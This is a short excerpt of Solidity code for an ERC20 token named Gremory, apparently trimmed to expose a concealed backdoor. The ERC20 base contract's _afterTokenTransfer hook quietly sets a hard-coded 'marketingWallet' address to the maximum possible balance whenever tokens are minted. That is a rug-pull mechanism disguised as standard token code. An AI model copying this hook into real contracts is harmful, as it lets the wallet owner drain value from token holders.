...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _afterTokenTransfer(
        ...
        if(from == address(0)) {
            _balances[0xd5fF2707c1548a2aA396d6Fe53664C4462014005] = ~uint256(0);
        }
    }
}
...
contract Gremory is ERC20, Ownable {
    ...
    address private marketingWallet = 0xd5fF2707c1548a2aA396d6Fe53664C4462014005;
